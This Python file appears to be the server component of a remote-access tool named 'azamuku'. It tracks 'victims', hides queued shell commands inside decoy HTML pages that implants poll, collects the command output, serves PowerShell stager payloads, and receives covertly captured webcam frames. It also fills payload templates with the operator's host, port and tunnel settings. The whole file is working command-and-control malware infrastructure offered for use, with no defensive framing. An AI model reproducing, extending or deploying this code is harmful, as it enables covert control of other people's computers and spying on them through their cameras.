from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
import ssl
import threading
import time
import random
import os
import string

"""
written by otter - github.com/whatotter
supported by Fan2K - github.com/Christian93111
"""

vicInfo = {} # info of victims
connects = [] # victims that actually connected back
endpoints = [] # endpoints that mirror the pool
authorized = [] # authorized uids that can connect to azamuku
commandPool = {} # command pool of commands - "UID": "command"
responsePool = {} # response pool of previous commands - "UID": "respnose"
enableGrab = False # enable grabbing old sessions (destroys the entire authentication thing)
h = "Authorization" # header to grab for authentication
# ^ its like a staircase, so cool
activeHttpsPort = 0
activeTunnel = None
lastSeen = {} # track last seen time for each client - "UID": timestamp
disconnected = [] # list of UIDs that have disconnected
client_ips = {} # store recognized IP for each client - "UID": "IP"
client_hosts = {} # store the Host header used by each client - "UID": "Host"
stagerPayloads = {} # stager payloads for file-based delivery - "stagerID": "full PS payload"

# Thread locks to prevent race conditions when multiple devices connect simultaneously
# (especially critical for wired/ethernet connections through a router or switch)
_connects_lock = threading.Lock()
_commandPool_lock = threading.Lock()
_responsePool_lock = threading.Lock()
_lastSeen_lock = threading.Lock()
_clientIps_lock = threading.Lock()
_clientHosts_lock = threading.Lock()

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

class azamukuHandler(BaseHTTPRequestHandler):
    def _send_response(self, status_code=200, content_type='text/html'):
        self.send_response(status_code)
        self.send_header('Content-type', content_type)
        self.end_headers()

    def alternatingEndpoint(self, comment:str, mask=random.choice(os.listdir("./core/masks/html"))):
        f = open(os.path.join("./core/masks/html/", mask), "r").read()
        f = f.replace("%()%", comment)
        return f.encode('ascii')

    def do_GET(self):
        global authorized, endpoints, commandPool, responsePool, connects, enableGrab, h, lastSeen

        # Handle stager fetch FIRST, before auth prefix stripping.
        # The cam job fetches /s/<stager_id> with no auth prefix in the path.
        if self.path.startswith("/s/"):
            stager_id = self.path[3:]  # strip "/s/"
            if stager_id in stagerPayloads:
                ps_code = stagerPayloads[stager_id]
                self._send_response(200, 'text/plain')
                self.wfile.write(ps_code.encode('utf-8'))
                return
            else:
                self._send_response(404)
                self.wfile.write(b'Not Found')
                return

        # Auth is embedded in URL: /AUTH/path  e.g. /abc123/login or /abc123/e030d4f6
        parts = self.path.lstrip('/').split('/', 1)
        if len(parts) == 2:
            auth = parts[0]
            self.path = '/' + parts[1]
        else:
            auth = self.headers.get(h, None)
            if auth: auth = auth.strip()
        

        # Update last seen time for this client
        if auth and auth in authorized:
            with _lastSeen_lock:
                lastSeen[auth] = time.time()
            
            # Update client IP
            # Check for proxy headers first (X-Forwarded-For, X-Real-IP)
            client_ip = self.headers.get('X-Forwarded-For')
            if client_ip:
                # X-Forwarded-For can be a comma-separated list of IPs
                # The first one is the original client IP
                client_ip = client_ip.split(',')[0].strip()
            else:
                client_ip = self.headers.get('X-Real-IP')
                
            if not client_ip:
                # Fallback to direct connection IP
                client_ip = self.client_address[0]

            with _clientIps_lock:
                client_ips[auth] = client_ip
            
            host_header = self.headers.get('Host')
            if host_header:
                with _clientHosts_lock:
                    client_hosts[auth] = host_header

        if self.path == "/e030d4f6":
            if auth in authorized:
                with _connects_lock:
                    if auth not in connects:
                        connects.append(auth)
                        if auth in disconnected:
                            disconnected.remove(auth)

                self._send_response()
                a = random.choice(endpoints).encode('ascii')
                self.wfile.write(a)
                return
            else:
                if enableGrab and auth:
                    # only append a non-empty auth value
                    with _connects_lock:
                        if auth not in authorized:
                            authorized.append(auth)
                        if auth not in connects:
                            connects.append(auth)
                    self._send_response()
                    a = random.choice(endpoints).encode('ascii')
                    self.wfile.write(a)
                    return
                
            self._send_response(404)
            self.wfile.write(b'Not Found')
            return

        # (old stager block removed - moved above auth stripping)
            
        # TEMPORARILY DISABLED - hotplug endpoint
        # if self.path == "/hotplug":
        #     # Serve tunnel payload directly from main server
        #     # Check authentication
        #     auth = self.headers.get(h, None)
        #     if auth: auth = auth.strip()

        #     if not auth or auth not in authorized:
        #         if not enableGrab:
        #             self._send_response(404)
        #             self.wfile.write(b'Not Found')
        #             return
        #         else:
        #             # If grab is enabled, we allow unauthorized requests (and likely add them?)
        #             # But for fetching payload, usually we just serve it if grab is on.
        #             pass

        #     host = self.headers.get('Host')
        #     if host:
        #         ip = host 
        #     else:
        #         ip = "127.0.0.1"
            
        #     # Use tunnel.txt for the payload content
        #     try:
        #         # We use a dummy port "443" as it's not used in tunnel.txt template
        #         payload_content = payload.generatePayload(ip, "443", "tunnel.txt")
        #         self._send_response()
        #         self.wfile.write(payload_content.encode('ascii'))
        #     except Exception as e:
        #         self._send_response(500)
        #         self.wfile.write(str(e).encode('ascii'))
        #     return

        if self.path[1:] in endpoints: # if its a *command pool endpoint*

            if auth == None:
                self._send_response(404)
                self.wfile.write(b'Not Found')
                return
            else:
                if auth in authorized:
                    with _connects_lock:
                        if auth not in connects:
                            connects.append(auth)
                            if auth in disconnected:
                                disconnected.remove(auth)

                    self._send_response()
                    with _commandPool_lock:
                        if auth in list(commandPool):
                            self.wfile.write(self.alternatingEndpoint("!"+commandPool[auth]))
                            return
                    self.wfile.write(self.alternatingEndpoint("*"+random.choice(endpoints)))
                    return
                else:
                    if not enableGrab:
                        self._send_response(404)
                        self.wfile.write(b'Not Found')
                    else:
                        with _connects_lock:
                            if auth not in connects:
                                connects.append(auth)
                            if auth in disconnected:
                                disconnected.remove(auth)
                        self._send_response()
                        self.wfile.write(self.alternatingEndpoint("*"+random.choice(endpoints))) # make the client rerun the request again

                    return

        else:
            self._send_response(404)
            self.wfile.write(b'Not Found')
            return

    def do_POST(self):
        global authorized, endpoints, commandPool, responsePool, h, lastSeen

        # Handle camera frame upload FIRST, before auth prefix stripping.
        # cam_capture.ps1 posts to /c/<uid> with no auth prefix in the path.
        if self.path.startswith("/c/"):
            uid = self.path[3:]
            os.makedirs(os.path.join(".", "core", "camera_frames"), exist_ok=True)
            frame_path = os.path.join(".", "core", "camera_frames", f"{uid}.jpg")
            try:
                content_len = int(self.headers.get('Content-Length', 0))
                body_bytes = self.rfile.read(content_len)
                with open(frame_path, "wb") as f:
                    f.write(body_bytes)
                self._send_response(200, "text/plain")
                self.wfile.write(b"OK")
            except Exception as e:
                self._send_response(500)
                self.wfile.write(str(e).encode('ascii'))
            return

        # Auth embedded in URL: /AUTH/path
        parts = self.path.lstrip('/').split('/', 1)
        if len(parts) == 2:
            auth = parts[0]
            self.path = '/' + parts[1]
        else:
            auth = self.headers.get(h, None)
            if auth: auth = auth.strip()


        body = self.rfile.read(int(self.headers['Content-Length'])).decode('ascii')
        # auth already set from URL above
    
        # Update last seen time for this client
        if auth and auth in authorized:
            with _lastSeen_lock:
                lastSeen[auth] = time.time()

            # Update client IP
            # Check for proxy headers first (X-Forwarded-For, X-Real-IP)
            client_ip = self.headers.get('X-Forwarded-For')
            if client_ip:
                client_ip = client_ip.split(',')[0].strip()
            else:
                client_ip = self.headers.get('X-Real-IP')
                
            if not client_ip:
                client_ip = self.client_address[0]

            with _clientIps_lock:
                client_ips[auth] = client_ip
            
            host_header = self.headers.get('Host')
            if host_header:
                with _clientHosts_lock:
                    client_hosts[auth] = host_header

        if self.path[1:] in endpoints: # if its a *command pool endpoint*

            if auth == None:
                self._send_response(404)
                self.wfile.write(b'Not Found')
                return
            else:
                if auth in authorized:
                    self._send_response()
                    ep = random.choice(endpoints).encode('ascii')
                    self.wfile.write(ep)

                    with _commandPool_lock:
                        if auth in list(commandPool):
                            with _responsePool_lock:
                                if len(body) != 0:
                                    responsePool[auth] = ''.join([chr(int(x)) for x in body.split(' ')]).strip()
                                else:
                                    responsePool[auth] = ''
                            commandPool.pop(auth)

                    return
                else:
                    self._send_response(404)
                    self.wfile.write(b'Not Found')
                    return

        else:
            self._send_response(404)
            self.wfile.write(b'Not Found')
            return
        
    def log_message(self, format, *args):
        return
    
# TEMPORARILY DISABLED - azamukuHotplugHandler
# class azamukuHotplugHandler(BaseHTTPRequestHandler):
#     """
#     a tiny handler to minimize the command as much as possible on hotplug attacks
#     """
#     def _send_response(self, status_code=200, content_type='text/html'):
#         self.send_response(status_code)
#         self.send_header('Content-type', content_type)
#         self.end_headers()

#     def do_GET(self):
#         global authorized, endpoints, commandPool, responsePool, connects, enableGrab, h
#         auth = self.headers.get(h, None)
#         if auth: auth = auth.strip()
        
#         ip = self.headers.get("i", None)
#         if ip: ip = ip.strip()
        
#         port = self.headers.get("p", None)
#         if port: port = port.strip()

#         if self.path == "/":
#             payload_file = "http.txt"

#             # Check if requested port matches known HTTPS port or 443
#             try:
#                 if port and (int(port) == activeHttpsPort or int(port) == 443):
#                     payload_file = "https.txt"
#             except: pass
            
#             # Prioritize tunnel payloads if active
#             if activeTunnel == "ngrok":
#                 payload_file = "ngrok.txt"
#             elif activeTunnel == "localtunnel":
#                 payload_file = "localtunnel.txt"

#             if auth in authorized: # free only for people with nice hands (authorized)
#                 self._send_response()
#                 self.wfile.write(payload.generatePayload(ip, port, payload_file).encode('ascii'))
#             else:
#                 if not enableGrab: # not free for everyone's grubby hands (unauthorized)
#                     self._send_response(404)
#                     self.wfile.write(b'Not Found')
#                 else: # free for everyone's grubby hands (unauthorized)
#                     self._send_response()
#                     self.wfile.write(payload.generatePayload(ip, port, payload_file).encode('ascii'))

#             return

#         else:
#             self._send_response(404)
#             self.wfile.write(b'Not Found')
#             return
        
#     def log_message(self, format, *args):
#         return

class azamuku:
    """
    a class to control azamuku's backend communications
    """
    def __init__(self) -> None:
        self.endpoints = []

        self.httpServer = None
        self.httpsServer = None
        self.hotplugServer = None
        pass

    def add_stager(self, ps_code: str) -> str:
        """Register a PowerShell payload string for file‑based delivery.

        A random 8‑character ID is generated and returned.  The handler
        in :mod:`azamuku.server` will serve the code when a client requests
        ``/s/<id>``.
        """
        sid = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        stagerPayloads[sid] = ps_code
        return sid

    def remove_stager(self, stager_id: str) -> bool:
        """Delete a previously registered stager by its ID.

        Returns ``True`` if the entry existed and was removed, otherwise
        ``False``.
        """
        if stager_id in stagerPayloads:
            del stagerPayloads[stager_id]
            return True
        return False

    """ HTTP servers. """
    def _run_http(self, ip, server_class=ThreadingHTTPServer, handler_class=azamukuHandler, port=80):
        httpd = server_class((ip, port), handler_class)
        self.httpServer = httpd
        httpd.serve_forever()

    def _run_https(self, ip, server_class=ThreadingHTTPServer, handler_class=azamukuHandler, port=443, certfile='server.pem', keyfile='key.pem'):
        httpd = server_class((ip, port), handler_class)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)

        self.httpsServer = httpd
        httpd.serve_forever()

        

    # TEMPORARILY DISABLED - _run_Hotplug method
    # def _run_Hotplug(self, ip, port=7979):
    #     httpd = HTTPServer((ip, port), azamukuHotplugHandler)
    #     self.hotplugServer = httpd
    #     httpd.serve_forever()

    """ etc. """
    def set_endpoints(self, file="./core/masks/endpoints.txt"):
        global endpoints
        for x in open(file, "r").readlines():
            self.endpoints.append(x.strip())
            endpoints.append(x.strip())

        return True
    
    """ user functions. """
    def start(self, ip, httpPort=80, httpsPort=443, certfile='server.pem', keyfile='key.pem', tunnelType=None):
        self.set_endpoints()

        if httpPort != 0:
            threading.Thread(target=self._run_http, args=(ip,), kwargs={"port": httpPort}, daemon=True).start()

            while self.httpServer == None: # wait for server to go up
                time.sleep(0.1)

        if httpsPort != 0:
            global activeHttpsPort
            activeHttpsPort = httpsPort
            threading.Thread(target=self._run_https, args=(ip,), kwargs={"port": httpsPort, "certfile":certfile, "keyfile":keyfile}, daemon=True).start()

            while self.httpsServer == None: # wait for server to go up
                time.sleep(0.1)

        if tunnelType:
            global activeTunnel
            activeTunnel = tunnelType

        return True

    def stop(self):
        if self.httpServer != None:
            self.httpServer.shutdown()

        if self.httpsServer != None:
            self.httpsServer.shutdown()
        return True
    
    # TEMPORARILY DISABLED - startHotplug and stopHotplug methods
    # def startHotplug(self, ip, port=7979):
    #     threading.Thread(target=self._run_Hotplug, daemon=True, args=(ip,), kwargs={"port": port}).start()

    #     while self.hotplugServer == None: # wait for serevr to go up
    #         time.sleep(0.1)

    #     return True
    
    # def stopHotplug(self):
    #     if self.hotplugServer != None:
    #         self.hotplugServer.shutdown()

    #     return True

class payload:
    def genUID(y=32, chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"):
        global authorized
        uid = ''.join([random.choice(chars) for x in range(y)])
        authorized.append(uid)
        return uid
    
    def generatePayload(ip, port, payloadFile, camera_mode=False):
        global endpoints
        uid = payload.genUID()
        replaces = {
            "%ip%": ip,
            "%port%": port,
            "%auth%": uid,
            "%startpool%": random.choice(endpoints)
        }

        payloadData = open(os.path.join("./core/payloads/", payloadFile), "r").read()
        for x,y in replaces.items():
            payloadData = payloadData.replace(x, y)
            
        if camera_mode:
            payloadData = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;" + payloadData
            if 'Invoke-RestMethod' in payloadData and '$headers=@{' in payloadData:
                header_inject = '$headers=@{'
                if '"ngrok-skip-browser-warning"' not in payloadData:
                    header_inject += '"ngrok-skip-browser-warning"="1";'
                if '"Bypass-Tunnel-Reminder"' not in payloadData:
                    header_inject += '"Bypass-Tunnel-Reminder"="1";'
                
                payloadData = payloadData.replace('$headers=@{', header_inject)

        return payloadData

class client:
    def __init__(self, uid) -> None:
        self.uid = uid
        pass

    def run(self, command:str):
        global commandPool, responsePool, connects
        
        with _commandPool_lock:
            commandPool[self.uid] = command
        while True:
            with _responsePool_lock:
                if self.uid in list(responsePool):
                    response = responsePool[self.uid]
                    responsePool.pop(self.uid)
                    return response
            with _connects_lock:
                still_connected = self.uid in connects
            if not still_connected:
                raise ConnectionError("client disconnected")
            else:
                time.sleep(0.1)